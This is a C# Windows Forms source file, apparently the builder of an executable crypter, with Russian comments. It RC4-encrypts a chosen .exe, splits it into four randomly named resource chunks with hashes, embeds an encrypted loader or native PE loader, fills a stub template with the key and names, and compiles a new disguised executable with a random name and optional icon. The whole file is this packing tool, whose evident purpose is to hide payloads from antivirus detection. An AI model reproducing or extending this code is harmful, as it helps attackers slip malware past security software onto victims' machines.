using System;
using System.IO;
using System.Resources;
using System.Windows.Forms;
using Builder.Properties;

namespace Builder
{
    public partial class Form1 : Form
    {
        private bool isNative;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            tIcon.Enabled = false;
            bIcon.Enabled = false;
        }

        private void cIcon_CheckedChanged(object sender, EventArgs e)
        {
            tIcon.Enabled = cIcon.Checked;
            bIcon.Enabled = cIcon.Checked;
        }

        private void bFile_Click(object sender, EventArgs e)
        {
            using (var open = new OpenFileDialog())
            {
                open.Title = "Select file";
                open.Filter = ".exe|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    tFile.Text = open.FileName;
                }
            }
        }

        private void bIcon_Click(object sender, EventArgs e)
        {
            using (var open = new OpenFileDialog())
            {
                open.Title = "Select icon";
                open.Filter = ".ico|*.ico";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    tIcon.Text = open.FileName;
                }
            }
        }

        private void cNative_CheckedChanged(object sender, EventArgs e)
        {
            isNative = cNative.Checked;
        }

        private void bCrypt_Click(object sender, EventArgs e)
        {
            if (tFile.Text != "")
            {
                using (var save = new SaveFileDialog())
                {
                    save.Title = "Save file";
                    save.Filter = ".exe|*.exe";
                    save.FileName = Helper.RandomString(5);

                    if (save.ShowDialog() == DialogResult.OK)
                    {
                        var comp = false;
                        string source = Resources.Stub; // читаем стаб
                        string encKey = Helper.RandomPassNew(); // делаем ключ
                        byte[] file = Helper.RC4.Encrypt(File.ReadAllBytes(tFile.Text), encKey); // шифруем файл
                        byte[] load = Helper.RC4.Encrypt(!isNative ? Resources.Loader : Resources.PELoader, encKey);
                        File.WriteAllBytes("test.txt", File.ReadAllBytes(tFile.Text));
                        int a = file.Length / 4;
                        byte[] partOfTheBytes = new byte[a];
                        string[] partOfTheFile = new string[4];
                        string[] partOfHash = new string[4];

                        for (int i = 0; i < 4; i++)
                        {
                            Array.Copy(file,i * a,partOfTheBytes,0,a);
                            partOfHash[i] = Helper.MD5.Encrypt(Convert.ToBase64String(partOfTheBytes));
                            var encKey1 = Helper.RandomPassNew();
                            partOfTheBytes = Helper.RC4.Encrypt(partOfTheBytes, encKey1);
                            partOfTheFile[i] = Convert.ToBase64String(partOfTheBytes);
                        }

                        var nameResource = Helper.RandomString(9); // генирируем имя для ресурсов
                        var loaderName = Helper.RandomString(5); // генирируем имя для лоадера
                        string[] hashes =
                        {
                            Helper.RandomString(5), Helper.RandomString(6), Helper.RandomString(7),
                            Helper.RandomString(8)
                        };
                        string[] files =  {
                            Helper.RandomString(9), Helper.RandomString(10), Helper.RandomString(11),
                            Helper.RandomString(12)
                        };
                        var resource = new ResourceWriter(nameResource + ".resources"); // открываем запись в ресурс
                        for (int i = 0; i < 4; i++)
                        {
                            resource.AddResource(files[i], partOfTheFile[i]);
                            resource.AddResource(hashes[i],partOfHash[i]);
                        }
                        resource.AddResource(loaderName, load); // добавляем лоадер
                        resource.Generate(); // сохраняем ресурс
                        resource.Close(); // закрываем запись
                        var isNativestr = isNative ? "true" : "false";

                        source =  // подставляем значение в стабе
                            source.Replace("[resName]", nameResource)
                                .Replace("[loaderName]", loaderName)
                                .Replace("[keyEnc]", encKey)
                                .Replace("[args]",tArgs.Text)
                                .Replace("[isNative]",isNativestr)
                            .Replace("[partOfHash0]", hashes[0])
                            .Replace("[partOfHash1]", hashes[1])
                            .Replace("[partOfHash2]", hashes[2])
                            .Replace("[partOfHash3]", hashes[3])
                            .Replace("[filepart0]", files[0])
                            .Replace("[filepart1]", files[1])
                            .Replace("[filepart2]", files[2])
                            .Replace("[filepart3]", files[3])
                            .Replace("[fileLength]",file.Length.ToString());

                        if (cIcon.Checked && tIcon.Text != "") // компиляция
                            comp = Compil.Compiler(source, save.FileName, cOutVersion.Text, Application.StartupPath + "\\" + nameResource + ".resources", tIcon.Text);

                        else if (!cIcon.Checked)
                            comp = Compil.Compiler(source, save.FileName, cOutVersion.Text, Application.StartupPath + "\\" + nameResource + ".resources");

                        if (comp)
                            MessageBox.Show("Done Ё-пта", "All good", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }
            else
            {
                MessageBox.Show("Selected file or icon", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
